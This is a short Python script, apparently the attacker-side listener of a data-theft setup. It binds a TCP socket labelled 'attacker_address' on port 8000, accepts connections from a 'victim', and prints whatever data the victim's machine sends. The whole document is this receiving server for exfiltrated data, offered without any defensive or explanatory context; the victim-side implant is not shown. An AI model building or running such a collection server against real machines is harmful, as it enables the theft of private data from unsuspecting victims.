import socket
attacker_address=('192.168.1.5',8000)
with socket.socket(socket.AF_INET,socket.SOCK_STREAM) as attacker_socket:
    attacker_socket.bind(attacker_address)
    attacker_socket.listen(1)

    while True:
        connection,victim_address=attacker_socket.accept()
        with connection:
            while True:
                data=connection.recv(1024)
                if not data:
                    break
                print(data.decode('utf-8'))